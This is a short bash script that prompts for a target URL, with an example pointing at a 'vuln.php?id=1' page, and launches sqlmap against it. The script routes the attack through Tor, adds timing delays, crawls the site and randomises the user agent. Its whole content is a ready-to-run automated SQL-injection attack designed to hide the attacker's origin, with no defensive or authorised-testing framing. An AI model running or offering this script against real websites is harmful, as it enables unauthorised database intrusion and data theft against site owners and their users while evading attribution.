#!/bin/bash
echo "example: http://www.site.com/vuln.php?id=1"
echo "ENTER TARGET URL:"
read vartarget
sqlmap -u $vartarget --tor --time-sec 20 --crawl=2 --random-agent


